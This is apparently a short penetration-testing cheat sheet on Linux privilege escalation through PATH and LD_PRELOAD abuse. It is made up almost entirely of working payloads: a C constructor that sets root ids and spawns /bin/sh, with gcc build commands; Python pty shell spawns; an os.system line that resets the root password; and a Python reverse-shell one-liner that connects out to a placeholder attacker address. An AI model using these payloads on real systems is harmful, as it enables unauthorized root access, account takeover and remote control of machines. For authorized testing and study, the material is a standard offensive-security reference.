title: Abusing Paths

# C
Using the below shell code we can create a binary that will pop a shell as the user running it. This is useful if we can abuse programs or `sudo` misconfigurations 

```c
#include <unistd.h>

__attribute__((constructor))
static void init() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
}
```

* To build
```
gcc -o exploit shell.c
```

If `gcc` throws an error `/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/Scrt1.o: in function _start: (.text+0x24): undefined reference to main'` then we can use the `-nostartfiles` flag

```
gcc -o exploit shell.c -nostartfiles
```

* To build as shared library 
```
gcc -shared -o exploit.so -fPIC  shell.c
```

Once built we can abuse `LD_PRELOAD` and `PATH`

# Python
Again we can use abuse `LD_PRELOAD` and `PATH` to escalate our privileges via python. 


**Interactive**

If we have a application we can abuse in an interactive way then we use `pty` to drop into a shell.

* write access to script
```
import pty;pty.spawn("/bin/bash")
```

* abuse library paths
```python
"""
"""
import pty
pty.spawn("/bin/bash")
exit()
```

**Non Interactive**

If the script is running under `cron`, `systemd` timers or other means then we will need to get creative.

We could use `os.system` to run a system command, for example if the script run's as root.

```python
import os
os.system("echo -n 'r00tr00t\nr00tr00t' | passwd")
```

Or we could use to get a reverse shell.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP-ADDRESS}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```